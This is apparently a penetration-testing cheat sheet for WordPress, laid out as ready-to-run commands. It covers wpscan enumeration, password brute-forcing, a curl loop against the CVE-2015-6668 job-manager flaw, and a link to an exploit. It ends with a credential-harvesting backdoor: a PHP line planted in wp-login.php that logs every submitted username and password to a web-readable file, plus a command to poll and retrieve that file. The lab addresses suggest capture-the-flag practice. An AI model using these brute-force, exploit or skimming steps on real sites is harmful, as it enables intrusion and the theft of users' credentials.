---
icon: wordpress
---

# Wordpress

{% hint style="info" %}
### <mark style="color:purple;">Installation</mark>

```sh
gem install wpscan
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Enumeration</mark>

{% code title="Basic Scan" %}
```bash
wpscan --url https://example.com
```
{% endcode %}

{% code title="Users" %}
```sh
wpscan --url https://example.com --enumerate u
```
{% endcode %}

{% code title="Plugins" %}
```sh
wpscan --url https://example.com --enumerate ap
```
{% endcode %}

{% code title="Themes" %}
```sh
wpscan --url https://example.com --enumerate at
```
{% endcode %}

***

### <mark style="color:purple;">Brute-Forcing</mark>

{% code title="With username" overflow="wrap" %}
```sh
wpscan --url https://example.com --passwords passwords.txt --usernames admin
```
{% endcode %}

{% code title="With users wordlist" overflow="wrap" %}
```sh
wpscan --url https://example.com --passwords passwords.txt --usernames users.txt
```
{% endcode %}

{% code title="With a custom wordlist" %}
```sh
wpscan --url https://example.com --passwords custom.txt
```
{% endcode %}

***

### <mark style="color:purple;">Vulnerability Scanner</mark>

{% code title="Full Scan" %}
```sh
wpscan --url https://example.com --enumerate vp,vt,vt
```
{% endcode %}

{% code title="Plugins" %}
```sh
wpscan --url https://example.com --enumerate vp
```
{% endcode %}

{% code title="Themes" %}
```sh
wpscan --url https://example.com --enumerate vt
```
{% endcode %}

{% code title="Timthumbs" %}
```sh
wpscan --url https://example.com --enumerate tt
```
{% endcode %}

{% code title="Uses WPVulnDB" overflow="wrap" %}
```sh
wpscan --url https://example.com --enumerate vp,vt,vt --api-token YOUR_API_TOKEN
```
{% endcode %}

***

### <mark style="color:purple;">Other</mark>

{% code title="With output" %}
```sh
wpscan --url https://example.com --output example.json
```
{% endcode %}

{% code title="Custom User-Agent" overflow="wrap" %}
```sh
wpscan --url https://example.com --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">Vulnerabilities</mark>

<mark style="color:orange;">**`CVE-2015-6668`**</mark>

* <mark style="color:purple;">There is a path traversal in the</mark> <mark style="color:orange;">**`job-manager`**</mark> <mark style="color:purple;">plugin version</mark> <mark style="color:orange;">**`0.7.25`**</mark>
* <mark style="color:purple;">By browsing to</mark> <mark style="color:orange;">**`IP/index.php/jobs/apply/8/`**</mark> <mark style="color:purple;">and modifying the number in the URL, it is possible to find the names of existing applications.</mark>

{% code title="Enumerate with curl" overflow="wrap" %}
```sh
for i in $(seq 1 25); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'>' -f2 | cut -d'<' -f1; done
```
{% endcode %}

* <mark style="color:purple;">Use this</mark> [<mark style="color:orange;">**`POC`**</mark>](https://github.com/jimdiroffii/CVE-2015-6668/blob/main/exploit.py) <mark style="color:purple;">to look for files associated to an application.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Harvesting Credentials</mark>

* <mark style="color:purple;">If is possible to write in</mark> <mark style="color:orange;">**`wp-login.php`**</mark><mark style="color:purple;">, add this line just after</mark> <mark style="color:orange;">**`<?php`**</mark><mark style="color:purple;">**:**</mark>

{% code overflow="wrap" %}
```php
file_put_contents("/var/www/html/dev_wiki/hijack.txt", $_POST['log'] . " : " . $_POST['pwd'], FILE_APPEND);
```
{% endcode %}

* <mark style="color:purple;">Use this command to get the hijacked file as soon as is used:</mark>

{% code overflow="wrap" %}
```sh
watch -n 1 curl -s -X GET http://10.10.10.78/dev_wiki/hijack.txt
```
{% endcode %}
{% endhint %}

